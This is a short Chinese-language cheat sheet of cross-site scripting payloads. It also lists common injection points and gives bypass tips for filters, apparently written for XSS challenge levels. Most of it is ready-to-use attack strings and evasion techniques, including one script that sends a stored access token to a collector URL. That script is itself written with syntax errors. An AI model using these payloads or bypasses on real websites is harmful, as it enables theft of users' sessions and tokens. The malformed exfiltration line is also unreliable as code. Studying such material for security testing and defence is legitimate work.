xss常用payload
1.<img src=1 onerror=alert(1)>

2.<script>newImage().src='http://localhost/cookie.phpc='+localStorage.getItem('access_token');
</script>

3.<script>alert(document.cookie);</script>

4.<a href="javascript:alert(1);">点开看</a>

5.<svg/onload=alert(1)>

6."onclick="alert(1)



xss常见出现的地方：

1、数据交互的地方

> get、post、cookies、headers
>
> 反馈与浏览
>
> 富文本编辑器
>
> 各类标签插入和自定义

2、数据输出的地方

> 用户资料
>
> 关键词、标签、说明
>
> 文件上传



xss过关技巧

1.超链接点不动是因为语法错误，可以用//注释掉后面多余的部分。也可以用换行符%0A，%0D。
2.符号被过滤可以用html实体字符转换，十进制和十六进制都可以。
3.输出在<a href>中用javascript：alert（1）；
4.尝试用"闭合属性（”onclick="alert(1)）,或者闭合整个标签（"><script>alert(1)<script>）。
5.明确输入和输出。

6.关键字：

?keyword=" ' sRc DaTa OnFocus OnmOuseOver OnMouseDoWn P <sCriPt> <a hReF=javascript:alert()> &#106; 



学习地址：

[xss 常用标签及绕过姿势总结 - FreeBuf网络安全行业门户](https://www.freebuf.com/articles/web/340080.html)
